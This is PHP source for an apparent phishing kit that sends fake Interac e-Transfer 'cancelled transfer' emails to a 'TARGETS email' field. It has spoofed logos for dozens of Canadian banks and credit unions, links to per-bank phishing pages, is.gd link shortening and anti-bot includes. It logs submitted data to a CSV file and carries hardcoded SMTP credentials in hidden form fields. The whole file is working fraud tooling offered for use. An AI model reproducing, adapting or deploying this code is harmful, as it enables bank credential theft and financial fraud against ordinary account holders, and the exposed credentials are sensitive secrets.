
<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require("PHPMailer/src/PHPMailer.php");
require("PHPMailer/src/SMTP.php");
require("PHPMailer/src/Exception.php");

include "/anti/anti1.php";
include "/anti/anti2.php";
include "/anti/anti3.php";
include "/anti/anti4.php";
include "/anti/anti5.php";
include "/anti/anti6.php";
include "/anti/anti7.php";
include "/anti/anti8.php";
include "/control.php";
include "/connect/out.php";
include "/mods/antibot.php";

$sender_name = $_POST['sender_name'];
$amount = $_POST['amount'];
$date = $_POST['date'];
$link = $_POST['link'];

$data = array($sender_name, $amount, $date, $link);
$file = fopen('/data.csv', 'a');
fputcsv($file, $data);
fclose($file);

$long_url = 'https://' . $_SERVER['HTTP_HOST'] . '/public/deposit/indexx.php?' . http_build_query($_POST);
$short_url = shortenURL($long_url);

$template = $_POST['template']; // The selected template from the dropdown
$message = file_get_contents('Cancel.html');
$message = str_replace('{{etransfer_interac_ca}}', $short_url, $message);
$message = str_replace('{{line}}', $_POST['line'], $message);
$message = str_replace('{{username}}', $_POST['username'], $message);
$message = str_replace('{{photo_href}}', $_POST['photo_href'], $message);
$message = str_replace('{{bank}}', $_POST['bank'], $message);
$message = str_replace('{{amount}}', $_POST['amount'], $message);
$message = str_replace('{{photo_link}}', $_POST['photo_link'], $message);
$message = str_replace('{{link}}', $_POST['link'], $message);
$message = str_replace('{{EXPIRE}}', $_POST['EXPIRE'], $message);
$message = str_replace('{{line}}', $_POST['line'], $message);
$message = str_replace('{{link}}', $_POST['link'], $message);
$message = str_replace('{{sender_name}}', $_POST['sender_name'], $message);
$message = str_replace('{{receivers_name}}', $_POST['receivers_name'], $message);
$message = str_replace('{{receivers_email}}', $_POST['receivers_email'], $message);

$mail = new PHPMailer();
$mail->IsSMTP();
$mail->SMTPSecure = 'tls';
$mail->Host = $_POST['host'];
$mail->Port = $_POST['port'];
$mail->Body = $message;
$mail->SMTPAuth = true;
$mail->Username = $_POST['username'];
$mail->Password = $_POST['password'];
$mail->SetFrom('taytayburkeallday@gmail.com', $_POST['sender_name']);
$mail->AddAddress($_POST['receivers_email']);
$mail->Subject = 'INTERAC e-Transfer: '.$_POST['sender_name'].' Cancelled Transfer.';
$mail->IsHTML(true);
$mail->CharSet = "utf-8";

if (!$mail->Send()) {
    echo "Mailer Error: " . $mail->ErrorInfo;
}

function shortenURL($url)
{
    $api_url = 'https://is.gd/create.php?format=simple&url=' . urlencode($url);
    return file_get_contents($api_url);
}

$currentDate = new DateTime();
$line = $currentDate->add(new DateInterval('P30D'))->format('F d, Y');
?>
<!DOCTYPE html>
<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      background-color: #000;
      color: #fff;
      font-family: Arial, sans-serif;
    }

    h1 {
      text-align: center;
    }

    form {
      margin: 20px;
    }

    input[type="text"], select {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;
      border: none;
      background-color: #333;
      color: #fff;
    }

    input[type="submit"] {
      width: 100%;
      padding: 10px;
      border: none;
      background-color: #0066cc;
      color: #fff;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <form action="submit1.php" method="POST" enctype="multipart/form-data">
    <h1>CANCEL NOTICE </h1>
<input type="hidden" name="etransfer_interac_ca" value="" required="">
<input type="text" name="receivers_email" placeholder="TARGETS email" value="" required="">
<input type="text" name="receivers_name" placeholder="receivers name" value="One Time Contact" required="">
<input type="text" name="sender_name" placeholder="AB201293 LTD or" value="AB201293 LTD" required="">
<input type="hidden" name="line" value="<?php echo $line; ?>" required="">
<center>
<select name="photo_href" id="photo_href">

<option value="https://etransfer-content.interac.ca/en/logo_CA000003.png">RBC Royal Bank

</option>
 
<option value="">--WORKING--

 </option>  

 <option value="https://etransfer-content.interac.ca/en/logo_CA000002.png">Scotiabank

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000001.png">BMO

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000010.png">CIBC

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000004.png">TD

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000292.png">National Bank

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000045.png">Desjardins

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000118.png">Laurentian Bank

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000062.png">HSBC

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000344.png">Simplii Financial

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000007.png">Tangerine

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000310.png">Motusbank

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000343.png">Manulife Bank

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000016.png">President's Choice Financial

</option>

<option value="">------PROVINCAL------

</option>  

<option value="https://etransfer-content.interac.ca/en/logo_CA000220.png">B.C. [VANCITY]

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000219.png">ALBERTA  [ATB]

</option>

<option value="">----CREDIT-U-OTHER----

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000315.png">FirstOntario Credit Union

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000238.png">Meridian Credit Union

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000346.png">Motive Financial

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000324.png">Alterna Savings

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000210.png">Bridgewater Bank

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000311.png">Oaken Financial

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000341.png">Zag Bank

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000217.png">Servus Credit Union

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000314.png">Westminster Savings Credit Union

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000325.png">Christian Credit Union

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000331.png">Vancity Credit Union

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000332.png">Valley First Credit Union

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000338.png">Mountain View Financial

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000345.png">Connect First Credit Union

</option>

</select>
<select name="bank" id="bank">

<option value="RBC Royal Bank">RBC Royal Bank

</option>
 
<option value="Scotia Bank">Scotia Bank

 </option>
 
 <option value="Bank of Montreal">Bank of Montreal

 </option>
 
 <option value="CIBC">CIBC

 </option>

 
 <option value="ATB Financial">ATB Financial

 </option>
 
 <option value="TD Canada Trust">TD Canada Trust

 </option>
 
 <option value="HSBC Bank Canada">HSBC Bank Canada

 </option>
 
 <option value="National Bank of Canada">National Bank of Canada

 </option>
 
 <option value="Desjardins">Desjardins

 </option>
 
 <option value="Laurentian Bank of Canada">Laurentian Bank of Canada

 </option>
 
 <option value="Manulife Bank of Canada">Manulife Bank of Canada

 </option>
 
 <option value="Tangerine Bank">Tangerine Bank

 </option>
 
 <option value="Motus">Motusbank

 </option>
 
 <option value="Simplii Financial">Simplii Financial

 </option>
 
 <option value="Vancity">Vancity

 </option>
    
</select>
    <style>

    </style>
    <select name="photo_href" id="photo_href">
 
    <option value="/sco/928460.php">RBC Royal Bank

 </option>
 
 <option value="/sco/928460.php">Scotia Bank

 </option>
 
 <option value="/simplii/928460.php">Scotia Bank

 </option> 
 
 <option value="/bmo/928460.php">Bank of Montreal

 </option>
 
 <option value="/cibc/928460.php">CIBC

 </option>
 
 <option value="/rbc/928460.php">RBC Royal Bank

 </option>
 
 <option value="/td/928460.php">TD Canada Trust

 </option>
 
 <option value="/hsbc/928460.php">HSBC Bank Canada

 </option>
 
 <option value="/nbc/928460.php">National Bank of Canada

 </option>
 
 <option value="/desj/928460.php">Desjardins

 </option>
 
 <option value="/laur/928460.php">Laurentian Bank of Canada

 </option>
 
 <option value="/manu/928460.php">Manulife Bank of Canada

 </option>
 
 <option value="/tang/928460.php">Tangerine Bank

 </option>
 
 <option value="/equitable/928460.php">Equitable Bank

 </option>
 
 <option value="/motus/928460.php">Motusbank

 </option>
</select>

<input type="hidden" name="port" value="2525" required="">
<input type="hidden" name="username" value="taytayburkeallday@gmail.com" required="">
<input type="hidden" name="password" value="E491908C41CE3BFA84FA8F67672C26B78454" required="">
<input type="hidden" name="host" value="smtp.elasticemail.com" required="">

  <input type="submit" value="Submit">

</fieldset></form></body></html>